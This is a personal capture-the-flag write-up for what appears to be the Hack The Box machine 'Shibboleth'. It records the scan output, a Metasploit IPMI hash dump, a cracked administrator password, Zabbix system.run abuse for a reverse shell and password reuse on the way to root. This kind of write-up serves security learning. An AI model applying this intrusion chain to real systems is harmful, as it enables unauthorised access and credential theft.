# Shibboleth

Difficulty: 4
Key takeway: check http://linpeas.sh output very carefully and re-use passwords 
Tags: Linux, linpeas, mariadb, mysql, password reuse, zabbix
Type: Linux

# Enumeration

portscan 

```bash
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.41
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: FlexStart Bootstrap Template - Index
```

- dir scan

```bash
/index.html           (Status: 200) [Size: 59474]                                             │
/blog.html            (Status: 200) [Size: 19196]                                             │
/assets               (Status: 301) [Size: 317] [--> http://shibboleth.htb/assets/]           │
/forms                (Status: 301) [Size: 316] [--> http://shibboleth.htb/forms/]            │
/changelog.txt        (Status: 200) [Size: 499]
```

- found a subdomain → `monitor.shibboleth.htb`
- running Zabbix 5.0
- [http://monitor.shibboleth.htb/zabbix.php](http://monitor.shibboleth.htb/zabbix.php) seems interesting

![zabbix.png](Shibboleth%20ae78f81963d54489bd9aeb2cdd4524f8/zabbix.png)

zabbix.php?action parameter gives different results

- UDP port 623 running on the server

```bash
msf6 auxiliary(scanner/ipmi/ipmi_dumphashes) > run 

[+] 10.129.207.193:623 - IPMI - Hash found: Administrator:e0cd0a1d8202000084c9967369b62f15416c60d80d6837e44f466033f9b77a180e5dcbb76269fe67a123456789abcdefa123456789abcdef140d41646d696e6973747261746f72:f8fd85a73000532eed2b8cbeb696260b37971db2
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

- Found Administrator hashes

```bash
msf6 > use auxiliary/scanner/ipmi/ipmi_dumphashes
msf6 auxiliary(scanner/ipmi/ipmi_dumphashes) > show options

Module options (auxiliary/scanner/ipmi/ipmi_dumphashes):

   Name                 Current Setting                                                    Required  Description
   ----                 ---------------                                                    --------  -----------
   CRACK_COMMON         true                                                               yes       Automatically crack common passwords as they are obtained
   OUTPUT_HASHCAT_FILE                                                                     no        Save captured password hashes in hashcat format
   OUTPUT_JOHN_FILE                                                                        no        Save captured password hashes in john the ripper format
   PASS_FILE            /usr/share/metasploit-framework/data/wordlists/ipmi_passwords.txt  yes       File containing common passwords for offline cracking, one per line
   RHOSTS                                                                                  yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT                623                                                                yes       The target port
   THREADS              1                                                                  yes       The number of concurrent threads (max one per host)
   USER_FILE            /usr/share/metasploit-framework/data/wordlists/ipmi_users.txt      yes       File containing usernames, one per line

msf6 auxiliary(scanner/ipmi/ipmi_dumphashes) > set rhosts shibboleth.htb
rhosts => shibboleth.htb
msf6 auxiliary(scanner/ipmi/ipmi_dumphashes) > set threads 10
threads => 10
msf6 auxiliary(scanner/ipmi/ipmi_dumphashes) > run 

[+] 10.129.207.193:623 - IPMI - Hash found: Administrator:e0cd0a1d8202000084c9967369b62f15416c60d80d6837e44f466033f9b77a180e5dcbb76269fe67a123456789abcdefa123456789abcdef140d41646d696e6973747261746f72:f8fd85a73000532eed2b8cbeb696260b37971db2
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed

```

- Found Administrator password from the hash `ilovepumkinpie1`

```bash
e0cd0a1d8202000084c9967369b62f15416c60d80d6837e44f466033f9b77a180e5dcbb76269fe67a123456789abcdefa123456789abcdef140d41646d696e6973747261746f72:f8fd85a73000532eed2b8cbeb696260b37971db2:ilovepumkinpie1

Session..........: hashcat
Status...........: Cracked
```

# Initial Access

- Configuration → hosts → items
    - create item
    - system.run[bash reverse shell &, nowait]
        - & makes your reverse shell run in background and ensures that it doesn't terminate instantly

# Privilege Escalation

- reuse the ilovepumkinpie1 password to get ipmi-svc user
- check linpeas for db creds
    - use MariaDB 10.3 → os command injection / RCE exploit to get root shell

## Notes

-